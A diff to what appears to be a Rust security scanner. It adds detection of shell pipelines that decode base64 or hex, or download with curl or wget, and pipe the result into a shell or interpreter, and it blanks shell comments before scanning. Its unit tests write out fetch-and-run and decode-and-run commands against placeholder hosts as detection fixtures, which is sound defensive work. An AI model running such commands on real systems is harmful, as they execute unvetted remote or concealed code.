@@ -970,6 +970,142 @@ pub fn sh_reasons(p: &Pack, text: &[u32], depth: usize, in_subst: bool, walk: &m
     reasons
 }
 
+// ---------------- what a pipeline decodes or downloads, and runs (0.1.9, N-4) ----------------
+
+/// Does a command decode what it reads: `base64 -d` (`--decode`; macOS's `-D`), `basenc -d`, `openssl base64 -d`
+/// (or `enc … -d`), `xxd -r`?
+fn sh_decoder(name: &[u32], args: &[PyStr]) -> bool {
+    let word = |w: &str| args.iter().any(|a| is(a, w));
+    let short = |letter: char| {
+        args.iter().any(|a| pystr::starts_with(a, "-") && !pystr::starts_with(a, "--") && a[1..].contains(&c(letter)))
+    };
+    if is(name, "base64") || is(name, "basenc") {
+        word("--decode") || short('d') || (is(name, "base64") && short('D'))
+    } else if is(name, "openssl") {
+        args.first().is_some_and(|a| is(a, "base64") || is(a, "enc")) && word("-d")
+    } else {
+        is(name, "xxd") && short('r')
+    }
+}
+
+/// The program a command is when it runs the script it reads on stdin: a shell given no script (`sh`, `bash -s`,
+/// `sh -s -- ARGS`) or python, node, perl, ruby, php or bun given none (`python3`, `python3 -`); None for a script
+/// named, code given inline (`-c`, `-e`), a module (`-m`).
+fn sh_stdin_runner(p: &Pack, name: &[u32], args: &[PyStr]) -> Option<PyStr> {
+    let shell = in_set(p.strs("_SH_SHELLS"), name);
+    let python = pystr::starts_with(name, "python") && name[6..].iter().all(|&x| x == c('.') || (0x30..=0x39).contains(&x));
+    if !shell && !python && !["node", "nodejs", "perl", "ruby", "php", "bun"].iter().any(|n| is(name, n)) {
+        return None;
+    }
+    for a in args {
+        if is(a, "--") || is(a, "-") {
+            return Some(name.to_vec()); // (stdin, then a shell's positional parameters)
+        }
+        if !pystr::starts_with(a, "-") {
+            return None; // a script's path, or a command's word
+        }
+        let cluster = !pystr::starts_with(a, "--");
+        if shell && cluster && a[1..].contains(&c('c')) {
+            return None; // sh -c CODE
+        }
+        if shell && cluster && a[1..].contains(&c('s')) {
+            return Some(name.to_vec()); // sh -s: the script from stdin, the rest its parameters
+        }
+        if !shell && ["-c", "-e", "-E", "-m", "-p", "-r", "--eval", "--print", "-x"].iter().any(|f| is(a, f)) {
+            return None;
+        }
+    }
+    Some(name.to_vec())
+}
+
+/// What a shell text runs that it decoded or downloaded first (N-4): [(kind, the program)] for each pipeline that
+/// pipes a decoder's output (`echo … | base64 -d | bash`; kind "decoded") or a download written to stdout (`curl …
+/// | sudo python3`; kind "downloaded") into a shell or an interpreter that reads its script on stdin, through any
+/// filters (`| gunzip |`); and each shell's `-c`, `eval`, or interpreter's inline code handed what a decoder prints
+/// (`sh -c "$(echo … | base64 -d)"`; "decoded"). At most HOOK_MAX_COMMANDS commands, and substitutions two deep.
+pub fn piped_runs(p: &Pack, text: &[u32]) -> Vec<(&'static str, PyStr)> {
+    piped_runs_at(p, text, 0)
+}
+
+fn piped_runs_at(p: &Pack, text: &[u32], depth: usize) -> Vec<(&'static str, PyStr)> {
+    let mut out: Vec<(&'static str, PyStr)> = Vec::new();
+    if depth > 2 || text.is_empty() {
+        return out;
+    }
+    let decodes = |sub: &[u32]| {
+        sh_parse(p, sub).iter().any(|cmd| {
+            let (pi, name, _) = sh_program(p, cmd);
+            pi.is_some_and(|i| sh_decoder(&name, &cmd.words[i + 1..]))
+        })
+    };
+    let mut source: Option<&'static str> = None; // what the pipeline carries so far
+    for cmd in sh_parse(p, text).iter().take(p.usize("HOOK_MAX_COMMANDS")) {
+        if !cmd.pipe_in {
+            source = None;
+        }
+        let (pi, name, _) = sh_program(p, cmd);
+        if let Some(pi) = pi {
+            let args = &cmd.words[pi + 1..];
+            if let Some(kind) = source {
+                if let Some(runner) = sh_stdin_runner(p, &name, args) {
+                    out.push((kind, runner));
+                }
+            }
+            // a shell's -c or eval, or an interpreter's inline code, handed what a decoder prints
+            let inline = if in_set(p.strs("_SH_EVAL"), &name) {
+                Some(0)
+            } else {
+                args.iter().position(|a| {
+                    pystr::starts_with(a, "-")
+                        && !pystr::starts_with(a, "--")
+                        && (a[1..].contains(&c('c')) || (!in_set(p.strs("_SH_SHELLS"), &name) && is(a, "-e")))
+                })
+                .map(|k| k + 1)
+            };
+            if let Some(k) = inline {
+                let words = pi + 1 + k..cmd.words.len().min(pi + 2 + k + if in_set(p.strs("_SH_EVAL"), &name) { args.len() } else { 0 });
+                if cmd.subs.get(words).is_some_and(|subs| subs.iter().flatten().any(|s| decodes(s))) {
+                    out.push(("decoded", name.clone()));
+                }
+            }
+            for sub in cmd.subs.iter().flatten() {
+                for found in piped_runs_at(p, sub, depth + 1) {
+                    if !out.contains(&found) {
+                        out.push(found);
+                    }
+                }
+            }
+            if sh_decoder(&name, args) {
+                source = Some("decoded");
+            } else if source.is_none() && in_set(p.strs("_SH_HTTP"), &name) && sh_request(p, &name, args).disposition == "stdout" {
+                source = Some("downloaded");
+            }
+        }
+        if !cmd.pipe_out {
+            source = None;
+        }
+    }
+    out
+}
+
+/// The reasons piped_runs gives: "pipes code it decodes into <program>"; a download piped into a shell, "pipes a
+/// download into a shell" (what the install test says of `curl … | sh`), into an interpreter "downloads a script and
+/// runs it with <program>".
+pub fn piped_run_reasons(p: &Pack, text: &[u32]) -> Vec<PyStr> {
+    let mut reasons: Vec<PyStr> = Vec::new();
+    for (kind, runner) in piped_runs(p, text) {
+        let r = if kind == "decoded" {
+            pystr::concat(&[&u("pipes code it decodes into "), &runner])
+        } else if in_set(p.strs("_SH_SHELLS"), &runner) {
+            u("pipes a download into a shell")
+        } else {
+            pystr::concat(&[&u("downloads a script and runs it with "), &runner])
+        };
+        push_new(&mut reasons, r);
+    }
+    reasons
+}
+
 // ---------------- a shell script, and code ----------------
 
 /// core._code_text: is text JavaScript or Python rather than shell?
@@ -1125,17 +1261,29 @@ pub fn exec_command_flows(p: &Pack, text: &[u32]) -> Vec<(usize, PyStr)> {
     if !p.needles("_SH_EXEC_NEEDLES").any_in(text) {
         return Vec::new();
     }
+    command_flows(p, &exec_command_lines(p, text))
+}
+
+/// [`exec_command_flows`] for command lines already found: [(offset, reason)] of what each gives (a Go
+/// or Rust reader's commands, 0.1.9).
+pub fn command_flows(p: &Pack, lines: &[(usize, PyStr)]) -> Vec<(usize, PyStr)> {
     let mut out: Vec<(usize, PyStr)> = Vec::new();
     let mut walk = HookWalk::new();
-    for (at, cmd) in exec_command_lines(p, text) {
-        if crate::signs::pipes_download_to_shell(p, &cmd) {
+    for (at, cmd) in lines {
+        let at = *at;
+        if crate::signs::pipes_download_to_shell(p, cmd) {
             // (a hook's command reads these as the install test does)
             out.push((at, u("pipes a download into a shell")));
         }
-        if pystr::split_char(&cmd, c('\n')).iter().any(|row| crate::signs::runs_substituted_download(p, row)) {
+        if pystr::split_char(cmd, c('\n')).iter().any(|row| crate::signs::runs_substituted_download(p, row)) {
             out.push((at, crate::signs::cat_reason(p, "run")));
         }
-        for r in sh_reasons(p, &cmd, 0, true, &mut walk) {
+        for r in piped_run_reasons(p, cmd) {
+            if !out.iter().any(|(_, x)| *x == r) {
+                out.push((at, r));
+            }
+        }
+        for r in sh_reasons(p, cmd, 0, true, &mut walk) {
             out.push((at, r));
         }
     }
@@ -1149,21 +1297,17 @@ pub(crate) fn exec_command_lines(p: &Pack, text: &[u32]) -> Vec<(usize, PyStr)> 
     let mut out: Vec<(usize, PyStr)> = Vec::new();
     let mut values: Option<HashMap<PyStr, PyStr>> = None; // name -> the string literal it is given
     let max = p.usize("_SH_EXEC_MAX");
-    let max_assigns = p.usize("_DD_MAX_ASSIGNS");
     for m in p.re("_SH_EXEC_LINE_RE").finditer(text) {
         if out.len() >= max {
             break;
         }
         let vals = values.get_or_insert_with(|| {
             let mut v: HashMap<PyStr, PyStr> = HashMap::new();
-            for (k, a) in p.re("_DD_ASSIGN_RE").finditer(text).enumerate() {
-                if k >= max_assigns {
-                    break;
-                }
-                let value = a.group(2).unwrap_or(&[]);
+            for a in crate::flow::dd_assigns(p, text) {
+                let value = a.value(text);
                 let lead = value.len() - pystr::lstrip(value).len();
-                if let Some((got, _)) = sh_literal_at(p, text, a.start_of(2) as usize + lead) {
-                    let name = a.group(1).unwrap_or(&[]).to_vec();
+                if let Some((got, _)) = sh_literal_at(p, text, a.value_start() + lead) {
+                    let name = a.name(text).to_vec();
                     v.entry(name).or_insert(got);
                 }
             }
@@ -1252,4 +1396,425 @@ pub fn hook_command_risk(p: &Pack, cmd: &[u32], output_kept: bool) -> Vec<PyStr>
     }
     crate::signs::label_sends(p, cmd, &mut reasons);
     reasons
+}
+
+// ---------------- a shell script's comments (SH-COMMENT-FP, 0.1.9) ----------------
+
+/// A space, a tab or a carriage return: what ends a word on a line.
+fn sh_blank(ch: u32) -> bool {
+    ch == c(' ') || ch == c('\t') || ch == c('\r')
+}
+
+/// The index of the `"` that closes a double-quoted string whose text starts at text[i] (a substitution in it
+/// read to its end), else None.
+fn sh_dquote_end(text: &[u32], mut i: usize) -> Option<usize> {
+    let n = text.len();
+    while i < n {
+        let ch = text[i];
+        if ch == c('\\') {
+            i += 2;
+        } else if ch == c('"') {
+            return Some(i);
+        } else if ch == c('$') && text.get(i + 1) == Some(&c('(')) {
+            let j = sh_subst_end(text, i + 2);
+            if j >= n {
+                return None;
+            }
+            i = j + 1;
+        } else if ch == c('`') {
+            let j = sh_tick_end(text, i + 1);
+            if j >= n {
+                return None;
+            }
+            i = j + 1;
+        } else {
+            i += 1;
+        }
+    }
+    None
+}
+
+/// The index after the `))` that closes the arithmetic `((` at text[i], else None.
+fn sh_arith_end(text: &[u32], mut i: usize) -> Option<usize> {
+    let mut depth = 0usize;
+    while i < text.len() {
+        if text[i] == c('(') {
+            depth += 1;
+        } else if text[i] == c(')') {
+            depth -= 1;
+            if depth == 0 {
+                return Some(i + 1);
+            }
+        }
+        i += 1;
+    }
+    None
+}
+
+/// A here-document's delimiter after its `<<` (text[i] is the character after it): (the word, its quotes
+/// removed; whether `<<-` strips the body's leading tabs; the index after the word), else None.
+fn sh_here_word(text: &[u32], mut i: usize) -> Option<(PyStr, bool, usize)> {
+    let n = text.len();
+    let tabs = text.get(i) == Some(&c('-'));
+    if tabs {
+        i += 1;
+    }
+    while i < n && sh_blank(text[i]) {
+        i += 1;
+    }
+    let mut word: PyStr = Vec::new();
+    while i < n {
+        let ch = text[i];
+        if sh_blank(ch) || [c('\n'), c(';'), c('&'), c('|'), c('('), c(')'), c('<'), c('>')].contains(&ch) {
+            break;
+        }
+        if ch == c('\'') || ch == c('"') {
+            let j = pystr::find_char(text, ch, i + 1)?;
+            word.extend_from_slice(&text[i + 1..j]);
+            i = j + 1;
+        } else if ch == c('\\') {
+            word.extend_from_slice(pystr::sub(text, i + 1, i + 2));
+            i += 2;
+        } else {
+            word.push(ch);
+            i += 1;
+        }
+    }
+    if word.is_empty() {
+        None
+    } else {
+        Some((word, tabs, i))
+    }
+}
+
+/// The index after a here-document's body that starts at text[i], ended by a line that is `word` (its leading
+/// tabs stripped for `<<-`, a carriage return at its end aside), else None.
+fn sh_here_end(text: &[u32], mut i: usize, word: &[u32], tabs: bool) -> Option<usize> {
+    let n = text.len();
+    loop {
+        let end = pystr::find_char(text, c('\n'), i).unwrap_or(n);
+        let mut line = &text[i..end];
+        if tabs {
+            let k = line.iter().position(|&x| x != c('\t')).unwrap_or(line.len());
+            line = &line[k..];
+        }
+        if line.last() == Some(&c('\r')) {
+            line = &line[..line.len() - 1];
+        }
+        if line == word {
+            return Some((end + 1).min(n));
+        }
+        if end >= n {
+            return None;
+        }
+        i = end + 1;
+    }
+}
+
+/// A shell script's text with its comments blanked (SH-COMMENT-FP, 0.1.9), its offsets and lines kept: from a
+/// `#` that starts a word outside quotes, a here-document's body and arithmetic, to the end of its line, each
+/// character a space; a `#!` first line is kept. None when it blanks nothing, or when the text does not read to
+/// its end as a shell reads it (a quote, a here-document or arithmetic left open): the text is then read whole.
+pub fn sh_comments_blanked(text: &[u32]) -> Option<PyStr> {
+    let n = text.len();
+    let mut out: PyStr = text.to_vec();
+    let mut blanked = false;
+    let mut start = true; // the next character starts a word
+    let mut docs: Vec<(PyStr, bool)> = Vec::new(); // here-documents whose bodies follow this line
+    let mut i = if pystr::starts_with(text, "#!") { pystr::find_char(text, c('\n'), 0).unwrap_or(n) } else { 0 };
+    while i < n {
+        let ch = text[i];
+        if ch == c('\n') {
+            i += 1;
+            for (word, tabs) in std::mem::take(&mut docs) {
+                i = sh_here_end(text, i, &word, tabs)?;
+            }
+            start = true;
+        } else if sh_blank(ch) {
+            start = true;
+            i += 1;
+        } else if ch == c('#') && start {
+            let end = pystr::find_char(text, c('\n'), i).unwrap_or(n);
+            for x in &mut out[i..end] {
+                *x = c(' ');
+            }
+            blanked = true;
+            i = end;
+        } else if ch == c('\\') {
+            if text.get(i + 1) != Some(&c('\n')) {
+                start = false; // (a line continuation leaves it as it was)
+            }
+            i += 2;
+        } else if ch == c('\'') {
+            i = pystr::find_char(text, c('\''), i + 1)? + 1;
+            start = false;
+        } else if ch == c('"') {
+            i = sh_dquote_end(text, i + 1)? + 1;
+            start = false;
+        } else if ch == c('$') && text.get(i + 1) == Some(&c('\'')) {
+            // $'...': a backslash escapes the quote
+            let mut j = i + 2;
+            loop {
+                match text.get(j) {
+                    None => return None,
+                    Some(&x) if x == c('\\') => j += 2,
+                    Some(&x) if x == c('\'') => break,
+                    _ => j += 1,
+                }
+            }
+            i = j + 1;
+            start = false;
+        } else if pystr::starts_with_at(text, i, "$((") || pystr::starts_with_at(text, i, "((") {
+            let from = if ch == c('$') { i + 1 } else { i };
+            i = sh_arith_end(text, from)?;
+            start = false;
+        } else if pystr::starts_with_at(text, i, "<<") && !pystr::starts_with_at(text, i, "<<<") {
+            let (word, tabs, j) = sh_here_word(text, i + 2)?;
+            docs.push((word, tabs));
+            i = j;
+            start = false;
+        } else {
+            start = [c(';'), c('&'), c('|'), c('('), c(')'), c('<'), c('>'), c('`')].contains(&ch);
+            i += 1;
+        }
+    }
+    if blanked && docs.is_empty() {
+        Some(out)
+    } else {
+        None
+    }
+}
+
+/// Whether a word names the script's own file outside its substitutions: `$0`, `${0…}`, `$BASH_SOURCE`,
+/// `$ZSH_ARGZERO` (in braces or not), or a variable of `names` (assigned one of them).
+fn sh_self_word(word: &[u32], names: &[PyStr]) -> bool {
+    let n = word.len();
+    let ident = |x: u32| x == c('_') || (x < 128 && (x as u8 as char).is_ascii_alphanumeric());
+    let mut i = 0usize;
+    while i < n {
+        if pystr::starts_with_at(word, i, "$(") {
+            i = sh_subst_end(word, i + 2) + 1;
+            continue;
+        }
+        if word[i] == c('`') {
+            i = sh_tick_end(word, i + 1) + 1;
+            continue;
+        }
+        if word[i] == c('$') {
+            let mut j = i + 1;
+            if word.get(j) == Some(&c('{')) {
+                j += 1;
+            }
+            if word.get(j) == Some(&c('0')) {
+                return true;
+            }
+            let k = (j..n).find(|&k| !ident(word[k])).unwrap_or(n);
+            let name = &word[j..k];
+            if is(name, "BASH_SOURCE") || is(name, "ZSH_ARGZERO") || in_set(names, name) {
+                return true;
+            }
+            i = k.max(i + 1);
+            continue;
+        }
+        i += 1;
+    }
+    false
+}
+
+/// Whether an assignment's value is the script's own path: the name itself, or a substitution that resolves it
+/// (_SH_SELF_RESOLVERS: realpath, readlink, basename).
+fn sh_self_value(p: &Pack, value: &[u32], subs: &[PyStr], names: &[PyStr]) -> bool {
+    if sh_self_word(value, names) {
+        return true;
+    }
+    let resolvers = p.strs("_SH_SELF_RESOLVERS");
+    subs.iter().any(|sub| {
+        sh_parse(p, sub).iter().any(|cmd| {
+            let (at, name, _) = sh_program(p, cmd);
+            at.is_some_and(|k| in_set(resolvers, &name) && cmd.words[k + 1..].iter().any(|w| sh_self_word(w, names)))
+        })
+    })
+}
+
+fn sh_reads_own(p: &Pack, text: &[u32], names: &mut Vec<PyStr>, depth: usize) -> bool {
+    if depth > p.usize("_SH_SELF_MAX_DEPTH") {
+        return true;
+    }
+    let tools = p.strs("_SH_SELF_PATH_TOOLS");
+    let env_assign = p.re("_ENV_ASSIGN_RE");
+    for cmd in sh_parse(p, text) {
+        for (k, word) in cmd.words.iter().enumerate() {
+            if let Some(m) = env_assign.match_(word) {
+                let name = &word[..m.end() - 1];
+                if !in_set(names, name) && sh_self_value(p, &word[m.end()..], &cmd.subs[k], names) {
+                    names.push(name.to_vec());
+                }
+            }
+            if cmd.subs[k].iter().any(|sub| sh_reads_own(p, sub, names, depth + 1)) {
+                return true;
+            }
+        }
+        let (at, name, _) = sh_program(p, &cmd);
+        if let Some(k) = at {
+            if !in_set(tools, &name) && cmd.words[k + 1..].iter().any(|w| env_assign.match_(w).is_none() && sh_self_word(w, names)) {
+                return true;
+            }
+        }
+        if cmd.redirs.iter().any(|(op, target)| (is(op, "<") || is(op, "<>")) && sh_self_word(target, names)) {
+            return true;
+        }
+    }
+    false
+}
+
+/// Whether a shell script's commands read its own file (SH-COMMENT-FP, 0.1.9): the file (`$0`, `$BASH_SOURCE`,
+/// `$ZSH_ARGZERO`, a variable assigned one of them or what resolves it) given to a program that is not one the
+/// pack lists as only naming a path (_SH_SELF_PATH_TOOLS: dirname, echo, a shell run on it again), or read on
+/// standard input. Such a script's comments may be what it runs.
+pub fn sh_reads_own_file(p: &Pack, text: &[u32]) -> bool {
+    let mut names: Vec<PyStr> = Vec::new();
+    sh_reads_own(p, text, &mut names, 0)
+}
+
+/// What the install-script test reads of a shell script (SH-COMMENT-FP, 0.1.9): its text with its comments
+/// blanked, which no shell runs. None (the text read whole, as before): not a shell script (with a `#!` line,
+/// one that names no shell; without, a file the caller gives a language, or one that reads as code), no
+/// comment, a text that does not read to its end, or a script that reads its own file.
+pub fn script_without_comments(p: &Pack, text: &[u32], lang: Option<&str>) -> Option<PyStr> {
+    if !(pystr::starts_with(text, "#!") || lang.is_none()) || !shell_text(p, text) {
+        return None;
+    }
+    let bare = sh_comments_blanked(text)?;
+    if sh_reads_own_file(p, &bare) {
+        return None;
+    }
+    Some(bare)
+}
+
+#[cfg(test)]
+mod comment_tests {
+    use super::*;
+
+    fn blanked(text: &str) -> Option<String> {
+        sh_comments_blanked(&u(text)).map(|b| b.iter().filter_map(|&x| char::from_u32(x)).collect())
+    }
+
+    fn reads_own(text: &str) -> bool {
+        let p = crate::pack::current();
+        sh_reads_own_file(&p, &u(text))
+    }
+
+    #[test]
+    fn a_comment_is_blanked_its_line_and_offsets_kept() {
+        let comment = "# a `curl x | sh` it replaced";
+        assert_eq!(blanked(&format!("#!/bin/sh\n{comment}\necho hi # done\n")),
+                   Some(format!("#!/bin/sh\n{}\necho hi{}\n", " ".repeat(comment.len()), " ".repeat(7))));
+        assert_eq!(blanked("a;# x\nb|#y\n(#z\n").as_deref(), Some("a;   \nb|  \n(  \n"));
+        assert_eq!(blanked("f() { # x\n  :\n}\n").as_deref(), Some("f() {    \n  :\n}\n"));
+        assert_eq!(blanked("echo a \\\n# x\n").as_deref(), Some("echo a \\\n   \n"));     // (a line continuation)
+    }
+
+    #[test]
+    fn a_hash_that_starts_no_word_is_not_a_comment() {
+        for text in [
+            "#!/bin/sh\necho ok\n",                                   // the #! line alone
+            "echo ${#arr[@]} $# ${x#y} ${x##*/} a#b\n",                // parameters, a word's #
+            "echo '# x' \"# y\" $'# z\\'' \\# w\n",                     // quoted, escaped
+            "echo $((16#ff)) ; ((x = 2#10))\n",                        // arithmetic
+            "[[ $x =~ ^#[0-9]+$ ]] && curl -s http://x.invalid/a#b | sh\n",
+            "cat <<EOF\n# kept: a here-document's body\nEOF\n",
+            "cat <<-'END' | sh\n\t# kept\n\tEND\n",
+            "x=\"$(echo \"# not a comment\")\"\n",
+        ] {
+            assert_eq!(blanked(text), None, "{}", text);
+        }
+    }
+
+    #[test]
+    fn a_text_that_does_not_read_to_its_end_is_read_whole() {
+        for text in ["# x\necho 'open\n", "# x\ncat <<EOF\nbody\n", "# x\necho \"open\n", "# x\necho $((1 +\n"] {
+            assert_eq!(blanked(text), None, "{}", text);
+        }
+        assert_eq!(blanked("cat <<A <<B\n# a\nA\n# b\nB\n# c\n").as_deref(), Some("cat <<A <<B\n# a\nA\n# b\nB\n   \n"));
+    }
+
+    #[test]
+    fn a_script_that_reads_its_own_file() {
+        for text in [
+            "sed -n 's/^#//p' \"$0\" | sh\n",
+            "tail -n +5 \"${BASH_SOURCE[0]}\" | bash\n",
+            "while read -r l; do eval \"$l\"; done < \"$0\"\n",
+            "eval \"$(grep '^#X' $0 | cut -c3-)\"\n",
+            "SELF=$(readlink -f \"$0\")\nawk 'NR>9' \"$SELF\" | sh\n",
+            "export ME=\"$0\"; cat \"$ME\"\n",
+            "x=$(< \"$0\")\n",
+        ] {
+            assert!(reads_own(text), "{}", text);
+        }
+        for text in [
+            "PROJECT_DIR=\"$(cd \"$(dirname \"$0\")/../..\" && pwd)\"\n. \"$PROJECT_DIR/lib.sh\"\n",
+            "echo \"usage: $0 [-h]\" >&2; exit 2\n",
+            "DIR=$(dirname \"${BASH_SOURCE[0]}\"); bash \"$DIR/x.sh\"\n",
+            "exec \"$0\" --child \"$@\"\n",
+            "case \"$0\" in *bash) : ;; esac; [ -x \"$0\" ] && sudo \"$0\"\n",
+            "printf '%s\\n' '$0' | cat\n",
+        ] {
+            assert!(!reads_own(text), "{}", text);
+        }
+    }
+}
+
+#[cfg(test)]
+mod piped_run_tests {
+    use super::*;
+
+    fn runs(text: &str) -> Vec<(&'static str, String)> {
+        let p = crate::pack::current();
+        piped_runs(&p, &u(text)).into_iter().map(|(k, r)| (k, String::from_utf16_lossy(&r.iter().map(|&x| x as u16).collect::<Vec<_>>()))).collect()
+    }
+
+    fn reasons(text: &str) -> Vec<String> {
+        let p = crate::pack::current();
+        piped_run_reasons(&p, &u(text)).iter().map(|r| r.iter().filter_map(|&x| char::from_u32(x)).collect()).collect()
+    }
+
+    #[test]
+    fn code_decoded_and_piped_into_a_shell_or_an_interpreter() {
+        assert_eq!(runs("echo Y3VybCB4IHwgc2g= | base64 -d | bash"), [("decoded", "bash".to_string())]);
+        assert_eq!(runs("echo X | base64 --decode | gunzip | sudo sh -s -- -y"), [("decoded", "sh".to_string())]);
+        assert_eq!(runs("base64 -D <<< X | python3 -"), [("decoded", "python3".to_string())]);
+        assert_eq!(runs("echo X | openssl base64 -d -A | perl"), [("decoded", "perl".to_string())]);
+        assert_eq!(runs("echo 6375726c | xxd -r -p | /bin/bash"), [("decoded", "bash".to_string())]);
+        assert_eq!(runs("bash -c \"$(echo X | base64 -d)\""), [("decoded", "bash".to_string())]);
+        assert_eq!(runs("eval \"$(printf %s X | base64 -di)\""), [("decoded", "eval".to_string())]);
+        assert_eq!(runs("node -e \"$(echo X | base64 -d)\""), [("decoded", "node".to_string())]);
+        assert_eq!(reasons("echo X | base64 -d | sh"), ["pipes code it decodes into sh"]);
+    }
+
+    #[test]
+    fn a_download_piped_into_an_interpreter() {
+        assert_eq!(runs("curl -sSf https://example.invalid/x.py | sudo python3"), [("downloaded", "python3".to_string())]);
+        assert_eq!(runs("wget -qO- https://example.invalid/x | node"), [("downloaded", "node".to_string())]);
+        assert_eq!(reasons("curl -sSf https://example.invalid/x.py | sudo python3 | tr -d '\\0' | base64 -w 0"),
+                   ["downloads a script and runs it with python3"]);
+        assert_eq!(reasons("curl -fsSL https://example.invalid/i.sh | sh"), ["pipes a download into a shell"]);
+    }
+
+    #[test]
+    fn what_is_not_a_run() {
+        for text in [
+            "echo X | base64 -d > /tmp/x.bin",                          // decoded to a file, not run here
+            "echo X | base64 | bash",                                   // encoded, not decoded
+            "echo X | base64 -d | jq .",                                // a filter, not an interpreter
+            "curl -s https://example.invalid/v.json | python3 -c 'import json,sys; print(json.load(sys.stdin))'",
+            "curl -s https://example.invalid/v.json | python3 -m json.tool",
+            "curl -s https://example.invalid/x -o x.sh; bash x.sh",     // the install test's other reasons
+            "curl -s https://example.invalid/x | tee x.log",
+            "echo X | base64 -d; bash run.sh",                          // not one pipeline
+            "bash -c 'echo hi'",
+            "python3 script.py < <(echo x)",
+        ] {
+            assert_eq!(runs(text), [], "{}", text);
+        }
+    }
 }
